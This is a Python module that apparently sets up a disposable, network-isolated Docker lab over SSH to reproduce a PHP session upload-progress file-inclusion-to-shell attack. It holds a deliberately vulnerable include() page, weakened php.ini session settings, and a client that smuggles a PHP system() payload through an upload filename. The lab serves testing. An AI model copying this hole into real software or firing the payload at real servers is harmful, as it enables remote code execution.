"""Lifecycle for ChatBug's data-free PHP2Shell integration lab."""

from __future__ import annotations

import io
import shlex
import subprocess
import tarfile
import textwrap
from dataclasses import dataclass
from typing import Any

DEFAULT_PHP_FPM_IMAGE = "php:8.1.34-fpm-alpine"
NGINX_IMAGE = "nginx:alpine"
PYTHON_CLIENT_IMAGE = "python:3.12-alpine"
PROJECT_PREFIX = "chatbug-php2shell-lab"


@dataclass(frozen=True)
class LabSpec:
    """A remote, disposable Docker Compose lab definition."""

    ssh_host: str
    keep: bool = False
    remote_dir: str | None = None
    fpm_image: str = DEFAULT_PHP_FPM_IMAGE

    @property
    def project(self) -> str:
        return f"{PROJECT_PREFIX}-lfi"

    @property
    def network(self) -> str:
        return f"{self.project}_default"


def run_ssh(host: str, command: str, *, timeout: int = 300, check: bool = True) -> subprocess.CompletedProcess[str]:
    completed = subprocess.run(
        ["ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=8", host, command],
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
        check=False,
    )
    if check and completed.returncode != 0:
        raise RuntimeError(f"SSH command failed ({completed.returncode}): {completed.stderr or completed.stdout}")
    return completed


def resolve_remote_dir(spec: LabSpec) -> str:
    """Resolve a ChatArch-owned temporary root on the selected SSH target."""

    if spec.remote_dir:
        return spec.remote_dir
    home = run_ssh(spec.ssh_host, 'printf %s "$HOME"', timeout=30).stdout.strip()
    if not home.startswith("/"):
        raise RuntimeError("remote HOME was not an absolute path")
    return f"{home}/.chatarch/chatbug/labs/{spec.project}"


def lab_files(spec: LabSpec) -> dict[str, str]:
    """Return all synthetic files used by the integration lab."""

    compose = f"""
services:
  php-fpm:
    image: {spec.fpm_image}
    # Use the standalone vulnerable FPM runtime directly; the lab's webroot is
    # entirely synthetic and does not start any application database stack.
    entrypoint: ["php-fpm", "-F"]
    volumes:
      - ./webroot:/usr/local/share/cypht/lab-webroot:ro
      - ./php.ini:/usr/local/etc/php/conf.d/99-chatbug-lab.ini:ro
      - ./www.conf:/usr/local/etc/php-fpm.d/99-chatbug-lab.conf:ro
  nginx:
    image: {NGINX_IMAGE}
    volumes:
      - ./webroot:/usr/local/share/cypht/lab-webroot:ro
      - ./nginx.conf:/etc/nginx/conf.d/default.conf:ro
    depends_on: [php-fpm]
networks:
  default:
    internal: true
"""
    php_ini = """
[Session]
session.save_handler = files
session.save_path = /tmp
session.use_strict_mode = 0
session.use_cookies = 1
session.use_only_cookies = 0
session.upload_progress.enabled = On
session.upload_progress.cleanup = Off
session.upload_progress.prefix = upload_progress_
session.upload_progress.name = PHP_SESSION_UPLOAD_PROGRESS
session.upload_progress.freq = 1%
session.upload_progress.min_freq = 0
[PHP]
display_errors = On
error_reporting = E_ALL
post_max_size = 16M
upload_max_filesize = 16M
file_uploads = On
memory_limit = 128M
"""
    www_conf = """
[www]
listen = 9000
pm = static
pm.max_children = 1
catch_workers_output = yes
"""
    nginx_conf = r"""
server {
    listen 80;
    root /usr/local/share/cypht/lab-webroot;
    index hello.php;
    client_max_body_size 16m;
    location / { try_files $uri $uri/ /hello.php?$query_string; }
    location ~ \.php$ {
        fastcgi_pass php-fpm:9000;
        fastcgi_index hello.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        fastcgi_param SCRIPT_NAME $fastcgi_script_name;
        fastcgi_param DOCUMENT_ROOT $document_root;
        fastcgi_param HTTP_HOST $host;
        fastcgi_read_timeout 30;
        fastcgi_request_buffering off;
    }
}
"""
    hello_php = """<?php
header('Content-Type: text/plain');
echo 'Hello World', PHP_EOL;
"""
    # The lab sink captures the included output and extracts only the code
    # block between fixed delimiters, making positive/negative acceptance exact.
    vuln_php = """<?php
header('Content-Type: text/plain');
$page = $_GET['page'] ?? 'hello.php';
ob_start();
include($page);
$output = ob_get_clean();
if (preg_match('/___START___(.*?)___END___/s', $output, $matches)) {
    echo trim($matches[1]), PHP_EOL;
} else {
    echo $output;
}
"""
    client = r'''import http.client
import os
import time

sid = os.environ["LAB_SID"]
proof = os.environ["LAB_PROOF"]
command = {
    "list-tmp": "ls -la /tmp",
    "cat-marker": "cat /tmp/chatbug-marker.txt",
    "list-and-marker": "ls -la /tmp; echo MARKER; cat /tmp/chatbug-marker.txt",
}[proof]
boundary = "----chatbug-lab-boundary"
payload = f"<?php echo '___START___'; system('{command}'); echo '___END___';?>"
body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="f"; filename="{payload}"\r\n\r\n'
    "Z\r\n"
    f"--{boundary}--\r\n"
).encode("latin-1")
headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}",
    "Cookie": f"PHPSESSID={sid}",
    "Content-Length": str(len(body)),
    "Connection": "close",
}
for _ in range(60):
    try:
        conn = http.client.HTTPConnection("nginx", 80, timeout=3)
        conn.request("POST", "/hello.php", body, headers)
        post = conn.getresponse()
        post_body = post.read()
        conn.close()
        if post.status == 200 and b"Hello World" in post_body:
            break
    except OSError:
        pass
    time.sleep(0.5)
else:
    raise SystemExit("php-fpm did not become ready")

def get(path):
    conn = http.client.HTTPConnection("nginx", 80, timeout=10)
    conn.request("GET", path, headers={"Cookie": f"PHPSESSID={sid}", "Connection": "close"})
    response = conn.getresponse()
    data = response.read()
    conn.close()
    return response.status, data

positive_status, positive = get(f"/vuln.php?page=/tmp/sess_{sid}")
negative_status, negative = get(f"/hello.php?page=/tmp/sessions/sess_{sid}")
print("POST_STATUS", post.status)
print("POSITIVE_STATUS", positive_status)
print("NEGATIVE_STATUS", negative_status)
print("POSITIVE_BEGIN")
print(positive.decode("latin-1", errors="replace"))
print("POSITIVE_END")
print("NEGATIVE_BEGIN")
print(negative.decode("latin-1", errors="replace"))
print("NEGATIVE_END")
'''
    return {
        "docker-compose.yml": compose,
        "php.ini": php_ini,
        "www.conf": www_conf,
        "nginx.conf": nginx_conf,
        "webroot/hello.php": hello_php,
        "webroot/vuln.php": vuln_php,
        "client.py": client,
    }


def write_lab_files(spec: LabSpec, remote_dir: str) -> None:
    """Materialize only synthetic lab files on the selected target."""

    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as archive:
        for name, content in lab_files(spec).items():
            data = textwrap.dedent(content).encode()
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            info.mode = 0o644
            archive.addfile(info, io.BytesIO(data))
    run_ssh(spec.ssh_host, f"rm -rf {shlex.quote(remote_dir)} && mkdir -p {shlex.quote(remote_dir)}/webroot")
    completed = subprocess.run(
        ["ssh", "-o", "BatchMode=yes", spec.ssh_host, f"tar -x -C {shlex.quote(remote_dir)}"],
        input=buffer.getvalue(),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=90,
        check=False,
    )
    if completed.returncode:
        raise RuntimeError(completed.stderr.decode(errors="replace"))


def compose_command(project: str, remote_dir: str, args: str) -> str:
    return f"cd {shlex.quote(remote_dir)} && docker compose -p {shlex.quote(project)} {args}"


def start(spec: LabSpec) -> dict[str, Any]:
    """Create and start a data-free isolated Cypht PHP-FPM lab."""

    remote_dir = resolve_remote_dir(spec)
    write_lab_files(spec, remote_dir)
    output = run_ssh(spec.ssh_host, compose_command(spec.project, remote_dir, "up -d"), timeout=180).stdout
    return {"project": spec.project, "remote_dir": remote_dir, "output": output}


def seed_marker(spec: LabSpec, remote_dir: str, marker: str) -> dict[str, Any]:
    """Write a synthetic marker into the lab's own /tmp."""

    command = f"printf %s {shlex.quote(marker + chr(10))} > /tmp/chatbug-marker.txt && chmod 644 /tmp/chatbug-marker.txt"
    run_ssh(
        spec.ssh_host,
        compose_command(spec.project, remote_dir, f"exec -T php-fpm sh -c {shlex.quote(command)}"),
    )
    return {"path": "/tmp/chatbug-marker.txt", "marker": marker, "synthetic": True}


def run_lfi_proof(spec: LabSpec, remote_dir: str, sid: str, proof: str) -> dict[str, Any]:
    """Execute the fixed proof through the lab's internal network client."""

    cmd = (
        f"docker run --rm --network {shlex.quote(spec.network)} "
        f"-e LAB_SID={shlex.quote(sid)} -e LAB_PROOF={shlex.quote(proof)} "
        f"-v {shlex.quote(remote_dir)}:/work:ro -w /work "
        f"{PYTHON_CLIENT_IMAGE} python3 /work/client.py"
    )
    result = run_ssh(spec.ssh_host, cmd, timeout=180)
    output = result.stdout
    positive = _between(output, "POSITIVE_BEGIN\n", "\nPOSITIVE_END")
    negative = _between(output, "NEGATIVE_BEGIN\n", "\nNEGATIVE_END")
    return {
        "raw_stdout": output,
        "post_status": _number_after(output, "POST_STATUS "),
        "positive_status": _number_after(output, "POSITIVE_STATUS "),
        "negative_status": _number_after(output, "NEGATIVE_STATUS "),
        "positive_output": positive,
        "negative_output": negative,
    }


def _number_after(text: str, prefix: str) -> int | None:
    for line in text.splitlines():
        if line.startswith(prefix):
            try:
                return int(line[len(prefix) :])
            except ValueError:
                return None
    return None


def _between(text: str, start: str, end: str) -> str:
    if start not in text or end not in text:
        return ""
    return text.split(start, 1)[1].split(end, 1)[0].strip()


def logs(spec: LabSpec, remote_dir: str) -> str:
    """Return bounded lab service logs for diagnostics."""

    return run_ssh(
        spec.ssh_host,
        compose_command(spec.project, remote_dir, "logs --tail 80"),
        timeout=60,
        check=False,
    ).stdout


def stop(spec: LabSpec, remote_dir: str) -> dict[str, Any]:
    """Remove only the named disposable lab resources."""

    run_ssh(
        spec.ssh_host,
        f"if [ -d {shlex.quote(remote_dir)} ]; then {compose_command(spec.project, remote_dir, 'down -v --remove-orphans')}; fi; "
        f"rm -rf {shlex.quote(remote_dir)}",
        timeout=180,
        check=False,
    )
    return {"removed_project": spec.project, "removed_remote_dir": remote_dir}
